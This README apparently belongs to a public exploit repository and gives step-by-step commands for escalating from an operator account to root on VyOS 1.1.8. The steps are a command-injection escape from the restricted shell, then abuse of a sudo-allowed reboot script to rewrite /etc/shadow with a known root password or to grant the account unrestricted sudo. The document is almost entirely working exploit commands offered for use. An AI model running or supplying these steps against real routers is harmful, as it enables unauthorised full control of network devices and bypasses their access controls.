# VyOS-Get-Root
Privilege escalation to root on VyOS from an operator CLI

If you have operator-level console access on VyOS (or possibly another OS derived from Vyatta - Brocade vRouter or Ubiquiti EdgeOS) then you can use this technique to gain console access as root.  This has been tested on VyOS version 1.1.8.

The operator mode is already known to be insecure in other ways, so the account is normally not available.  However some administrators have manually added operator accounts.  Here is an example of how an operator account could be created.

```
configure
set system login user operator level operator
set system login user operator authentication plaintext-password Operator123
commit
save
```

Once logged in as `operator` with the password of `Operator123` in this example, you will be dropped into a restricted shell `/opt/vyatta/bin/restricted-shell` that normally does not have configuration write capabilities or access to the bash shell and commands.

Execute the following command to escape out of the `restricted-shell` and acquire a normal `bash` shell:<br />
`telnet "127.0.0.1;bash"`

See that you can now execute bash commands:<br />
`id`<br />
`sudo -l`

You should notice from the above command that an operator has limited sudo capabilities to scripts located under `/opt/vyatta/bin/sudo-users/`

You can exploit the `vyatta-reboot.pl` script to change the root password:<br />
``echo '`ROOTPW=$(openssl passwd -1 pwn3d); echo "root:$ROOTPW:17481:0:99999:7:::" > /tmp/shadow; tail -n +2 /etc/shadow >> /tmp/shadow; mv /tmp/shadow /etc/shadow; chmod 640 /etc/shadow; chown root:shadow /etc/shadow`' > /var/run/reboot.job``

`sudo /opt/vyatta/bin/sudo-users/vyatta-reboot.pl --action show_reboot`

`rm /var/run/reboot.job`

Now exit the CLI as the operator account and login as `root` with a password of `pwn3d`.

As an alternative to changing/setting root's password you could remove sudo restrictions on the `operator` account:<br />
``echo '`cp /etc/sudoers /tmp/; echo "%operator ALL=NOPASSWD: ALL" >> /tmp/sudoers; mv /tmp/sudoers /etc/; chmod 440 /etc/sudoers; chown root:root /etc/sudoers`' > /var/run/reboot.job``

`sudo /opt/vyatta/bin/sudo-users/vyatta-reboot.pl --action show_reboot`

`rm /var/run/reboot.job`

Now exit the CLI as the operator account and log back in as operator.  Break out of the restricted shell, escalate to a root shell and verify.<br />
`telnet "127.0.0.1;bash"`

`sudo su -`

`id`

